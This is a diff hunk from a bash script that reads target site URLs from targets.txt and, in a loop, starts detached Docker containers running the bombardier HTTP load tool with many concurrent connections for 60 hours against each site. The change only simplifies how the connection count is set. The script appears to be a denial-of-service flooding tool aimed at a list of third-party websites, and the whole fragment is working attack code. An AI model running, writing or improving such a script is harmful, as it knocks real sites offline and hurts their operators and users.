@@ -27,11 +27,7 @@ function start {
       if [ -n "$site_url" ]; then
           echo "Site: $site_url"
           for (( c=1; c<=count; c++ )); do
-            if [ -n "$1" ]; then
-                docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60h -l "$site_url"
-            else
-                docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60h -l "$site_url"
-            fi
+            docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60h -l "$site_url"
           done
       fi
   done < targets.txt
